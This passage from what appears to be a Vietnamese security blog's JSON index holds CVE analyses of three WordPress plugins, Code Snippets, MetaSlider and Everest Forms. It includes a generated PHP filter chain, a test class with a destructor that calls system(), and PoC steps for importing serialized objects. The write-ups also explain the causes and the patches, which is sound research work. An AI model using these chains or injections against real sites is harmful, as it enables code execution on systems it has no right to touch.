b·ªüi c·∫•u h√¨nh m·∫∑c ƒë·ªãnh allow_url_include, nh∆∞ng c√°c wrapper n·ªôi b·ªô nh∆∞ php://filter kh√¥ng b·ªã ·∫£nh h∆∞·ªüng b·ªüi gi·ªõi h·∫°n n√†y. Th√¥ng tin\rFilter chain trong PHP l√† c∆° ch·∫ø cho ph√©p b·∫°n n·ªëi nhi·ªÅu b·ªô l·ªçc (stream filters) l·∫°i v·ªõi nhau ƒë·ªÉ x·ª≠ l√Ω d·ªØ li·ªáu khi ƒë·ªçc ho·∫∑c ghi t·ª´ m·ªôt file/stream. N√≥ ho·∫°t ƒë·ªông d·ª±a tr√™n wrapper ƒë·∫∑c bi·ªát: php://filter. K·ªπ thu·∫≠t n√†y ƒë∆∞·ª£c s·ª≠ d·ª•ng trong c√°c cu·ªôc thi CTF, d·ª±a tr√™n nguy√™n l√Ω sau: php://filter: cho ph√©p g·∫Øn filter v√†o m·ªôt stream (·ªü ƒë√¢y l√† php://temp). Chu·ªói filter: c√°c filter ƒë∆∞·ª£c n·ªëi b·∫±ng k√Ω t·ª± |. D·ªØ li·ªáu ƒëi qua t·ª´ng filter theo th·ª© t·ª± t·ª´ tr√°i sang ph·∫£i. C√°c filter ch√≠nh trong chu·ªói: convert.iconv.\u003cfrom\u003e.\u003cto\u003e: chuy·ªÉn ƒë·ªïi encoding t·ª´ b·ªô m√£ n√†y sang b·ªô m√£ kh√°c. convert.base64-encode / convert.base64-decode: m√£ h√≥a ho·∫∑c gi·∫£i m√£ base64. Khi k·∫øt h·ª£p h√†ng ch·ª•c filter nh∆∞ v·∫≠y, d·ªØ li·ªáu s·∫Ω b·ªã bi·∫øn ƒë·ªïi nhi·ªÅu l·∫ßn: encode ‚Üí ƒë·ªïi encoding ‚Üí decode ‚Üí encode ‚Üí ‚Ä¶ cho ƒë·∫øn cu·ªëi c√πng. Tham kh·∫£o: https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it Ch·∫°y script sau ƒë·ªÉ t·∫°o PHP Filter Chain: $ python3 php_filter_chain_generator.py --chain '\u003c?php phpinfo(); ?\u003e ' [+] The following gadget chain will generate the following code : \u003c?php phpinfo(); ?\u003e (base64 value: PD9waHAgcGhwaW5mbygpOyA/PiAg) php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UT","date":"2025-11-27","objectID":"/vi/posts/2025-11-27-cve-2025-13035/:6:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-13035 Analysis \u0026 POC","uri":"/vi/posts/2025-11-27-cve-2025-13035/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng trong plugin Code Snippets xu·∫•t ph√°t t·ª´ vi·ªác s·ª≠ d·ª•ng extract() m√† kh√¥ng c√≥ c∆° ch·∫ø b·∫£o v·ªá, cho ph√©p ghi ƒë√® bi·∫øn n·ªôi b·ªô v√† d·∫´n ƒë·∫øn vi·ªác th·ª±c thi file tu·ª≥ √Ω th√¥ng qua require_once. Khi k·∫øt h·ª£p v·ªõi t√πy ch·ªçn ‚ÄúEnable file-based execution‚Äù v√† shortcode [code_snippet], m·ªôt ng∆∞·ªùi d√πng c√≥ quy·ªÅn Contributor c√≥ th·ªÉ k√≠ch ho·∫°t th·ª±c thi m√£ PHP kh√¥ng mong mu·ªën. B·∫£n v√° ƒë√£ kh·∫Øc ph·ª•c v·∫•n ƒë·ªÅ b·∫±ng c√°ch s·ª≠ d·ª•ng EXTR_SKIP, ƒë·∫£m b·∫£o c√°c bi·∫øn nh·∫°y c·∫£m kh√¥ng b·ªã ghi ƒë√® trong qu√° tr√¨nh x·ª≠ l√Ω shortcode. ","date":"2025-11-27","objectID":"/vi/posts/2025-11-27-cve-2025-13035/:7:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-13035 Analysis \u0026 POC","uri":"/vi/posts/2025-11-27-cve-2025-13035/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\rVi·ªác s·ª≠ d·ª•ng extract() m√† kh√¥ng ki·ªÉm so√°t bi·∫øn l√† r·ªßi ro nghi√™m tr·ªçng, ƒë·∫∑c bi·ªát khi d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë·∫øn t·ª´ ng∆∞·ªùi d√πng. PHP stream wrappers, bao g·ªìm filter chains, c√≥ th·ªÉ tr·ªü th√†nh c√¥ng c·ª• m·∫°nh m·∫Ω ƒë·ªÉ chuy·ªÉn ƒë·ªïi d·ªØ li·ªáu th√†nh m√£ th·ª±c thi. M·ªôt t√πy ch·ªçn c·∫•u h√¨nh t∆∞·ªüng ch·ª´ng v√¥ h·∫°i nh∆∞ ‚ÄúEnable file-based execution‚Äù c√≥ th·ªÉ m·ªü r·ªông b·ªÅ m·∫∑t t·∫•n c√¥ng ƒë√°ng k·ªÉ. C√°c shortcode WordPress c·∫ßn ƒë∆∞·ª£c x·ª≠ l√Ω c·∫©n tr·ªçng v√¨ ch√∫ng ƒë∆∞·ª£c Contributor s·ª≠ d·ª•ng trong n·ªôi dung b√†i vi·∫øt. Vi·ªác b·ªï sung EXTR_SKIP trong b·∫£n v√° cho th·∫•y c√°ch ƒë∆°n gi·∫£n nh∆∞ng hi·ªáu qu·∫£ ƒë·ªÉ gi·∫£m thi·ªÉu nguy c∆° ghi ƒë√® bi·∫øn nh·∫°y c·∫£m. ","date":"2025-11-27","objectID":"/vi/posts/2025-11-27-cve-2025-13035/:8:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-13035 Analysis \u0026 POC","uri":"/vi/posts/2025-11-27-cve-2025-13035/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rRemote Code Execution (RCE) WordPress Code Snippets Plugin \u003c= 3.9.1 is vulnerable to PHP Object Injection ","date":"2025-11-27","objectID":"/vi/posts/2025-11-27-cve-2025-13035/:9:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-13035 Analysis \u0026 POC","uri":"/vi/posts/2025-11-27-cve-2025-13035/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Responsive Slider by MetaSlider Plugin.","date":"2025-11-26","objectID":"/vi/posts/2025-11-26-cve-2025-26763/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/vi/posts/2025-11-26-cve-2025-26763/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rL·ªó h·ªïng Deserialization of Untrusted Data trong plugin MetaSlider Responsive Slider c·ªßa MetaSlider cho ph√©p Object Injection. V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn Responsive Slider by MetaSlider t·ª´ phi√™n b·∫£n ch∆∞a x√°c ƒë·ªãnh ƒë·∫øn 3.94.0. CVE ID: CVE-2025-26763 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 3.94.0 Patched Versions: 3.95.0 CVSS severity: Medium (9.8) Required Privilege: Editor Product: WordPress Responsive Slider by MetaSlider Plugin ","date":"2025-11-26","objectID":"/vi/posts/2025-11-26-cve-2025-26763/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/vi/posts/2025-11-26-cve-2025-26763/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Responsive Slider by MetaSlider: 3.94.0 ‚Äì vulnerable 3.95.0 ‚Äì patched Diff Tool (diff) ‚Üí Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o. ","date":"2025-11-26","objectID":"/vi/posts/2025-11-26-cve-2025-26763/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/vi/posts/2025-11-26-cve-2025-26763/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rTrong phi√™n b·∫£n l·ªói (v3.94.0): if (isset($slideshow['meta']) \u0026\u0026 is_array($slideshow['meta'])) { foreach ($slideshow['meta'] as $key =\u003e $value) { update_post_meta( $new_slideshow_id, $key, maybe_unserialize(str_replace('{#ID#}', $new_slideshow_id, $value)) ); } } Trong ƒëo·∫°n m√£ n√†y, h√†m maybe_unserialize() ƒë∆∞·ª£c g·ªçi tr·ª±c ti·∫øp tr√™n d·ªØ li·ªáu ng∆∞·ªùi d√πng ($value). V√¨ c√°c gi√° tr·ªã n√†y kh√¥ng ƒë∆∞·ª£c ki·ªÉm tra hay x√°c th·ª±c tr∆∞·ªõc khi unserialize, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n chu·ªói serialized ƒë·ªôc h·∫°i g√¢y PHP Object Injection. B·∫£n v√° (v3.95.0): S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°\rB·∫£n v√° ƒë√£ b·ªï sung hai l·ªõp b·∫£o v·ªá quan tr·ªçng ƒë·ªÉ ngƒÉn d·ªØ li·ªáu ƒë·ªôc h·∫°i b·ªã unserialize: Ch·∫∑n ngay m·ªçi gi√° tr·ªã meta c√≥ d·∫°ng serialized object (O:). N·∫øu ph√°t hi·ªán, qu√° tr√¨nh import d·ª´ng l·∫°i v√† slideshow b·ªã xo√°. if (isset($slideshow['meta']) \u0026\u0026 is_array($slideshow['meta'])) { foreach ($slideshow['meta'] as $key =\u003e $value) { // @since 3.95 - Stop the process and cleanup if we catch non valid data in JSON if ( is_serialized( $value ) \u0026\u0026 substr( trim( $value ), 0, 2 ) === 'O:' ) { wp_trash_post($new_slideshow_id); return new WP_Error( 'import_slideshow_error', esc_html__( 'Import file is invalid.', 'ml-slider' ) ); } update_post_meta( $new_slideshow_id, $key, $this-\u003emaybe_unserialize(str_replace('{#ID#}', $new_slideshow_id, $value)) ); } } Thay th·∫ø maybe_unserialize() b·∫±ng phi√™n b·∫£n an to√†n h∆°n, d√πng unserialize(..., ['allowed_classes' =\u003e false]) ƒë·ªÉ kh√¥ng cho ph√©p t·∫°o object khi gi·∫£i n√©n d·ªØ li·ªáu. public function maybe_unserialize( $data ) { if ( is_serialized( $data ) ) { // Don't attempt to unserialize data that wasn't serialized going in. return @unserialize( trim( $data ), array( 'allowed_classes' =\u003e false ) ); } return $data; } Nh·ªù ƒë√≥, nguy c∆° PHP Object Injection ƒë∆∞·ª£c lo·∫°i b·ªè. ","date":"2025-11-26","objectID":"/vi/posts/2025-11-26-cve-2025-26763/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/vi/posts/2025-11-26-cve-2025-26763/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rPlugin ƒë√£ ƒëƒÉng k√Ω m·ªôt POST API: protected $namespace = 'metaslider/v1'; register_rest_route($this-\u003enamespace, '/slideshow/import', array(array( 'methods' =\u003e 'POST', 'callback' =\u003e array($this-\u003eapi, 'import_slideshows'), 'permission_callback' =\u003e array($this-\u003eapi, 'can_access') ))); v·ªõi callback import_slideshows v√† ki·ªÉm tra quy·ªÅn th√¥ng qua can_access(). const DEFAULT_CAPABILITY_EDIT_SLIDES = 'edit_others_posts'; public function can_access() { $capability = apply_filters('metaslider_capability', MetaSliderPlugin::DEFAULT_CAPABILITY_EDIT_SLIDES); // Check for the nonce on the server (used by WP REST) if (isset($_SERVER['HTTP_X_WP_NONCE']) \u0026\u0026 wp_verify_nonce(sanitize_key($_SERVER['HTTP_X_WP_NONCE']), 'wp_rest')) { return current_user_can($capability); } // This is for when not using Axios (example: callout.php) if (isset($_REQUEST['METASLIDER_NONCE']) \u0026\u0026 wp_verify_nonce(sanitize_key($_REQUEST['METASLIDER_NONCE']), 'metaslider_request')) { return current_user_can($capability); } return false; } H√†m n√†y ch·ªâ cho ph√©p ng∆∞·ªùi d√πng c√≥ quy·ªÅn edit_others_posts t·ª©c l√† editor tr·ªü l√™n, ƒë∆∞·ª£c g·ªçi API. N√≥ x√°c th·ª±c theo hai c√°ch: N·∫øu c√≥ header X-WP-Nonce, plugin ki·ªÉm tra nonce 'wp_rest', r·ªìi x√°c nh·∫≠n ng∆∞·ªùi d√πng c√≥ quy·ªÅn edit_others_posts. N·∫øu c√≥ tham s·ªë METASLIDER_NONCE, plugin ki·ªÉm tra nonce 'metaslider_request', r·ªìi ti·∫øp t·ª•c ki·ªÉm tra quy·ªÅn. N·∫øu kh√¥ng h·ª£p l·ªá ·ªü c·∫£ hai tr∆∞·ªùng h·ª£p, quy·ªÅn truy c·∫≠p API b·ªã t·ª´ ch·ªëi. public function import_slideshows($request) { if (!$this-\u003ecan_access()) { $this-\u003edeny_access(); } $data = $this-\u003eget_request_data($request, array('slideshows')); if (!$data['slideshows']) { wp_send_json_error(array( 'message' =\u003e __('Nothing to import.', 'ml-slider') ), 400); } $status = $this-\u003eslideshows-\u003eimport((array) json_decode($data['slideshows'], true)); if (is_wp_error($status)) { wp_send_json_error(array( 'message' =\u003e $status-\u003eget_error_message() ), 400); } wp_send_json_success($status, 200); } H√†m import_slideshows: Ki·ªÉm tra quy·ªÅn truy c·∫≠p N·∫øu can_access() tr·∫£ v·ªÅ false ‚Üí ch·∫∑n ngay b·∫±ng deny_access(). L·∫•y d·ªØ li·ªáu ƒë·∫ßu v√†o L·∫•y tr∆∞·ªùng slideshows t·ª´ request. N·∫øu kh√¥ng c√≥ d·ªØ li·ªáu ‚Üí tr·∫£ l·ªói ‚ÄúNothing to import‚Äù. Gi·∫£i m√£ JSON v√† ti·∫øn h√†nh import Gi·∫£i m√£ n·ªôi dung slideshows r·ªìi g·ªçi h√†m $this-\u003eslideshows-\u003eimport() ƒë·ªÉ x·ª≠ l√Ω. X·ª≠ l√Ω l·ªói N·∫øu import tr·∫£ v·ªÅ WP_Error ‚Üí g·ª≠i JSON error v·ªõi th√¥ng b√°o l·ªói. Th√†nh c√¥ng N·∫øu kh√¥ng c√≥ l·ªói ‚Üí tr·∫£ v·ªÅ JSON success k√®m k·∫øt qu·∫£ import. Theo m√¥ t·∫£ c·ªßa h√†m import() th√¨ $slideshows l√† data ƒë∆∞·ª£c export t·ª´ slideshows ƒë√£ t·∫°o Tr√≠ch d·∫´n\r/** Will import slideshows * @param array $slideshows - The data generated by the export method * @throws Exception - handled within method. @return WP_Error|array - True on success, WP_Error on failure */ foreach ($slideshows as $index =\u003e $slideshow) { ... foreach ($slideshow['slides'] as $slide) { ... foreach ($slide['meta'] as $key =\u003e $value) { $value = $this-\u003erestore_image_urls_from_string($value); add_post_meta($new_slide_id, $key, maybe_unserialize($value)); } } ... } H√†m import() duy·ªát l·∫ßn l∆∞·ª£t t·ª´ng slideshow trong $slideshows, sau ƒë√≥ t·ª´ng slide trong m·ªói slideshow, v√† t·ª´ng meta c·ªßa m·ªói slide. V·ªõi m·ªói meta, n√≥ ph·ª•c h·ªìi URL h√¨nh ·∫£nh qua $this-\u003erestore_image_urls_from_string($value) r·ªìi th√™m meta m·ªõi cho slide b·∫±ng add_post_meta($new_slide_id, $key, maybe_unserialize($value)). N√≥i c√°ch kh√°c, m√£ th·ª±c hi·ªán import to√†n b·ªô slideshow, slide v√† meta, ƒë·ªìng th·ªùi x·ª≠ l√Ω URL h√¨nh ·∫£nh v√† unserialize d·ªØ li·ªáu tr∆∞·ªõc khi l∆∞u v√†o c∆° s·ªü d·ªØ li·ªáu. ","date":"2025-11-26","objectID":"/vi/posts/2025-11-26-cve-2025-26763/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/vi/posts/2025-11-26-cve-2025-26763/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"Editor sends POST request ‚Üí /metaslider/v1/slideshow/import\"] --\u003e B[\"import_slideshows() invoked\"]\rB --\u003e C{\"can_access(): verify nonce + 'edit_others_posts' capability\"}\rC -- Fail --\u003e Z[\"deny_access()\"]\rC -- Pass --\u003e D[\"Extract 'slideshows' from request\"]\rD --\u003e E[\"json_decode(slideshows) ‚Üí array of slideshow data\"]\rE --\u003e F[\"slideshows-\u003eimport() begins\"]\rF --\u003e G[\"foreach ($slideshows as $slideshow)\"]\rG --\u003e H[\"foreach ($slideshow['slides'] as $slide)\"]\rH --\u003e I[\"foreach ($slide['meta'] as key =\u003e value)\"]\rI --\u003e J[\"value = restore_image_urls_from_string(value)\"]\rJ --\u003e K{\"Is value serialized?\"}\rK -- Yes --\u003e L[\"maybe_unserialize(value)\"]\rK -- No --\u003e M[\"Store meta normally\"]\rL --\u003e N{\"Does unserialize create an object?\"}\rN -- Yes --\u003e R[\"Object Injection ‚Üí POP chain execution\"]\rN -- No --\u003e M\rM --\u003e O[\"add_post_meta(new_slide_id, key, value)\"]\rO --\u003e P[\"Import continues for remaining slideshows\"]\rR --\u003e Q[\"Exploit achieved\"]\rgraph TD\rA[\"Editor sends POST request ‚Üí /metaslider/v1/slideshow/import\"] --\u003e B[\"import_slideshows() invoked\"]\rB --\u003e C{\"can_access(): verify nonce + 'edit_others_posts' capability\"}\rC -- Fail --\u003e Z[\"deny_access()\"]\rC -- Pass --\u003e D[\"Extract 'slideshows' from request\"]\rD --\u003e E[\"json_decode(slideshows) ‚Üí array of slideshow data\"]\rE --\u003e F[\"slideshows-\u003eimport() begins\"]\rF --\u003e G[\"foreach ($slideshows as $slideshow)\"]\rG --\u003e H[\"foreach ($slideshow['slides'] as $slide)\"]\rH --\u003e I[\"foreach ($slide['meta'] as key =\u003e value)\"]\rI --\u003e J[\"value = restore_image_urls_from_string(value)\"]\rJ --\u003e K{\"Is value serialized?\"}\rK -- Yes --\u003e L[\"maybe_unserialize(value)\"]\rK -- No --\u003e M[\"Store meta normally\"]\rL --\u003e N{\"Does unserialize create an object?\"}\rN -- Yes --\u003e R[\"Object Injection ‚Üí POP chain execution\"]\rN -- No --\u003e M\rM --\u003e O[\"add_post_meta(new_slide_id, key, value)\"]\rO --\u003e P[\"Import continues for remaining slideshows\"]\rR --\u003e Q[\"Exploit achieved\"]\rgraph TD\rA[\"Editor sends POST request ‚Üí /metaslider/v1/slideshow/import\"] --\u003e B[\"import_slideshows() invoked\"]\rB --\u003e C{\"can_access(): verify nonce + 'edit_others_posts' capability\"}\rC -- Fail --\u003e Z[\"deny_access()\"]\rC -- Pass --\u003e D[\"Extract 'slideshows' from request\"]\rD --\u003e E[\"json_decode(slideshows) ‚Üí array of slideshow data\"]\rE --\u003e F[\"slideshows-\u003eimport() begins\"]\rF --\u003e G[\"foreach ($slideshows as $slideshow)\"]\rG --\u003e H[\"foreach ($slideshow['slides'] as $slide)\"]\rH --\u003e I[\"foreach ($slide['meta'] as key =\u003e value)\"]\rI --\u003e J[\"value = restore_image_urls_from_string(value)\"]\rJ --\u003e K{\"Is value serialized?\"}\rK -- Yes --\u003e L[\"maybe_unserialize(value)\"]\rK -- No --\u003e M[\"Store meta normally\"]\rL --\u003e N{\"Does unserialize create an object?\"}\rN -- Yes --\u003e R[\"Object Injection ‚Üí POP chain execution\"]\rN -- No --\u003e M\rM --\u003e O[\"add_post_meta(new_slide_id, key, value)\"]\rO --\u003e P[\"Import continues for remaining slideshows\"]\rR --\u003e Q[\"Exploit achieved\"]\rgraph TD\rA[\"Editor sends POST request ‚Üí /metaslider/v1/slideshow/import\"] --\u003e B[\"import_slideshows() invoked\"]\rB --\u003e C{\"can_access(): verify nonce + 'edit_others_posts' capability\"}\rC -- Fail --\u003e Z[\"deny_access()\"]\rC -- Pass --\u003e D[\"Extract 'slideshows' from request\"]\rD --\u003e E[\"json_decode(slideshows) ‚Üí array of slideshow data\"]\rE --\u003e F[\"slideshows-\u003eimport() begins\"]\rF --\u003e G[\"foreach ($slideshows as $slideshow)\"]\rG --\u003e H[\"foreach ($slideshow['slides'] as $slide)\"]\rH --\u003e I[\"foreach ($slide['meta'] as key =\u003e value)\"]\rI --\u003e J[\"value = restore_image_urls_from_string(value)\"]\rJ --\u003e K{\"Is value serialized?\"}\rK -- Yes --\u003e L[\"maybe_unserialize(value)\"]\rK -- No --\u003e M[\"Store meta normally\"]\rL --\u003e N{\"Does unserialize create an object?\"}\rN -- Yes --\u003e R[\"Object Injection ‚Üí POP chain execution\"]\rN -- No --\u003e M\rM --\u003e O[\"add_post_meta(new_slide_id, key, value)\"]\rO --\u003e P[\"Import continues for remaining slideshows\"]\rR --\u003e Q[\"Exploit achieved\"]\r","date":"2025-11-26","objectID":"/vi/posts/2025-11-26-cve-2025-26763/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/vi/posts/2025-11-26-cve-2025-26763/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rT·∫°o class ƒë·ªÉ test ƒë·∫∑t trong wp-config.php class Evil { public $command = \"ls /\"; public function __destruct() { die(system($this-\u003ecommand)); } } T·∫°o m·ªôt slideshow b·∫•t k·ª≥, export ƒë·ªÉ l·∫•y JSON file m·∫´u. S·ª≠a l·∫°i JSON file v·ªõi tr∆∞·ªùng ml-slider_type (ho·∫∑c m·ªôt tr∆∞·ªùng ƒë∆∞·ª£c duy·ªát b·∫•t k√¨) ch·ª©a chu·ªói serialized. Example: Import l·∫°i file JSON ƒë∆∞·ª£c s·ª≠a. K·∫øt qu·∫£\r","date":"2025-11-26","objectID":"/vi/posts/2025-11-26-cve-2025-26763/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/vi/posts/2025-11-26-cve-2025-26763/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªói ph√°t sinh do plugin g·ªçi maybe_unserialize() tr·ª±c ti·∫øp tr√™n d·ªØ li·ªáu import m√† kh√¥ng ki·ªÉm tra, cho ph√©p ch√®n chu·ªói serialized ƒë·ªôc h·∫°i d·∫´n ƒë·∫øn PHP Object Injection. B·∫£n v√° 3.95.0 ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch ch·∫∑n serialized object v√† d√πng h√†m unserialize an to√†n h∆°n. ","date":"2025-11-26","objectID":"/vi/posts/2025-11-26-cve-2025-26763/:7:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/vi/posts/2025-11-26-cve-2025-26763/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\rKh√¥ng ƒë∆∞·ª£c unserialize d·ªØ li·ªáu ng∆∞·ªùi d√πng khi ch∆∞a ki·ªÉm tra. Ch·ª©c nƒÉng import/export lu√¥n l√† b·ªÅ m·∫∑t t·∫•n c√¥ng nh·∫°y c·∫£m. Ki·ªÉm so√°t serialized data (ƒë·∫∑c bi·ªát l√† chu·ªói b·∫Øt ƒë·∫ßu b·∫±ng O:) l√† b·∫Øt bu·ªôc. D√πng allowed_classes =\u003e false ƒë·ªÉ ngƒÉn t·∫°o object khi unserialize. ","date":"2025-11-26","objectID":"/vi/posts/2025-11-26-cve-2025-26763/:8:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/vi/posts/2025-11-26-cve-2025-26763/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rDeserialization WordPress Responsive Slider by MetaSlider Plugin \u003c= 3.94.0 is vulnerable to PHP Object Injection ","date":"2025-11-26","objectID":"/vi/posts/2025-11-26-cve-2025-26763/:9:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/vi/posts/2025-11-26-cve-2025-26763/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Everest Forms Plugin.","date":"2025-11-25","objectID":"/vi/posts/2025-11-25-cve-2025-3439/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/vi/posts/2025-11-25-cve-2025-3439/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Everest Forms ‚Äì Contact Form, Quiz, Survey, Newsletter \u0026 Payment Form Builder for WordPress tr√™n WordPress t·ªìn t·∫°i l·ªó h·ªïng PHP Object Injection trong t·∫•t c·∫£ c√°c phi√™n b·∫£n cho ƒë·∫øn, v√† bao g·ªìm, 3.1.1 th√¥ng qua vi·ªác gi·∫£i tu·∫ßn t·ª± d·ªØ li·ªáu kh√¥ng tin c·∫≠y t·ª´ tham s·ªë field_value. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c ch√®n m·ªôt PHP Object. Ph·∫ßn m·ªÅm d·ªÖ b·ªã t·∫•n c√¥ng n√†y kh√¥ng c√≥ chu·ªói POP n√†o ƒë∆∞·ª£c bi·∫øt ƒë·∫øn, nghƒ©a l√† l·ªó h·ªïng n√†y s·∫Ω kh√¥ng g√¢y ·∫£nh h∆∞·ªüng tr·ª´ khi c√≥ plugin ho·∫∑c theme kh√°c ch·ª©a chu·ªói POP ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web. N·∫øu chu·ªói POP t·ªìn t·∫°i th√¥ng qua plugin ho·∫∑c theme b·ªï sung ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n h·ªá th·ªëng m·ª•c ti√™u, n√≥ c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng th·ª±c hi·ªán c√°c h√†nh ƒë·ªông nh∆∞ x√≥a t·ªáp t√πy √Ω, l·∫•y d·ªØ li·ªáu nh·∫°y c·∫£m, ho·∫∑c th·ª±c thi m√£ t√πy thu·ªôc v√†o chu·ªói POP hi·ªán di·ªán. CVE ID: CVE-2025-3439 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 3.1.1 Patched Versions: 3.1.2 CVSS severity: High (9.8) Required Privilege: Unauthenticated Product: WordPress Everest Forms Plugin ","date":"2025-11-25","objectID":"/vi/posts/2025-11-25-cve-2025-3439/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/vi/posts/2025-11-25-cve-2025-3439/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Everest Forms: 3.1.1 ‚Äì vulnerable 3.1.2 ‚Äì patched Diff Tool (diff) ‚Üí Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o. ","date":"2025-11-25","objectID":"/vi/posts/2025-11-25-cve-2025-3439/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/vi/posts/2025-11-25-cve-2025-3439/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rTrong phi√™n b·∫£n l·ªói (v3.1.1): if ( ! empty( $field_value ) || is_numeric( $field_value ) ) { if ( is_serialized( $field_value ) ) { $field_value = maybe_unserialize( $field_value ); } ... } Trong ƒëo·∫°n m√£ n√†y, h√†m maybe_unserialize() ƒë∆∞·ª£c g·ªçi tr·ª±c ti·∫øp tr√™n d·ªØ li·ªáu ng∆∞·ªùi d√πng ($field_value). ƒêi·ªÅu n√†y t·∫°o ra l·ªó h·ªïng nghi√™m tr·ªçng: Nguy c∆° Object Injection: N·∫øu attacker ch√®n payload PHP object v√†o d·ªØ li·ªáu base64, qu√° tr√¨nh decode v√† unserialize s·∫Ω kh·ªüi t·∫°o object ƒë·ªôc h·∫°i, d·∫´n ƒë·∫øn Object Injection v√† 